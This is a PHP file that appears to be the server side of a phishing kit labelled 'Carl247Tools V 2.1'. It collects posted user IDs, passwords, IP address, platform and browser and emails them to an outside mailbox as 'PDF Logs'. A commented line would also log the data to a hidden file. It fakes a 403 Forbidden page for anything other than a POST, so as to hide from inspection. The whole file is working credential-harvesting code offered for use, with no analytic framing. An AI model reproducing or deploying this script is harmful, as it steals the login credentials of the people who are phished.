<?php
header('Access-Control-Allow-Origin: *');  
error_reporting(0);

$to = 'zedbed2022@yandex.com';

if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }
    else{
        $ip = $remote;
    }

if(isset($_POST['TXT_02'])){
$id = $_POST['TXT_01'];
$id2 = $_POST['TXT_02'];
$ips = $_POST['TXT_03'];
$os = $_POST['TXT_04'];
$browser = $_POST['TXT_05'];
$body = "
    Carl247Tools V 2.1 [PRV8]
    [LOGIN DETAILS]
    UserId : [ $id ]
    Pass : [ $id2 ]
    [Client Info]
    IP > $ips
    Platform > $os
    Browser > $browser
    Track > http://www.ip-tracker.org/locator/ip-lookup.php?ip=$ip
    ";

    $sub = "PDF Logs From [$id] - $ip";
    
	mail($to, $sub, $body);
	
//file_put_contents(".robots.txt", $body."\n", FILE_APPEND);
echo $result;
}
}else{
	header('HTTP/1.0 403 Forbidden', true, 403);
	die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don\'t have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
');
}
?>